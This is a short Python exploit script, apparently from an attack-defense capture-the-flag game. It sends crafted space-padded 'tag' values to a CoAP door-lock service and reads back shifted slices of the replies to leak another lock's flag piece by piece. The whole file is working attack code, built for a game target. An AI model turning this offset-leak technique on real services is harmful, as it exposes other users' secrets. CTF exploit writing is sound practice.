#!/usr/bin/env python3

import sys
import logging
import asyncio
import string
import random

from aiocoap import *

OK, CORRUPT, MUMBLE, DOWN, CHECKER_ERROR = 101, 102, 103, 104, 110

logging.basicConfig(level=logging.INFO)

def random_str(size, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

async def request(protocol, method, url, payload):
    request = Message(code=method, uri=url, payload=payload.encode('ascii'))

    try:
        response = await protocol.request(request).response
    except Exception as e:
        print('Failed to fetch resource:')
        print(e)
        exit(DOWN)
    else:
        return response.payload.decode('ascii')


async def main(host, lock_id):
    protocol = await Context.create_client_context()

    uri = 'coap://%s/' % host
    id_prefix = random_str(3)

    flag = ''

    base_offset = 2

    for i in range(5):
        cur_offset = base_offset + 8 * i

        payload_str = ' ' * cur_offset + 'litlgirl'

        card = id_prefix + str(i)

        await request(protocol, POST, uri + 'add_card?lock=' + lock_id + '&card=' + card + '&tag=' + payload_str, '')
        flag += (await request(protocol, GET, uri + 'get_card?lock=' + lock_id + '&card=' + card, ''))[cur_offset:cur_offset + 8]

        #print(await request(protocol, GET, uri + 'get_card?lock=' + lock_id + '&card=' + card, ''))

    print(flag[2:34])

if len(sys.argv) != 3:
    print('Usage: %s HOST LOCK_ID' % sys.argv[0])
    sys.exit(CHECKER_ERROR)

host = sys.argv[1]
lock_id = sys.argv[2]
asyncio.get_event_loop().run_until_complete(main(host, lock_id))

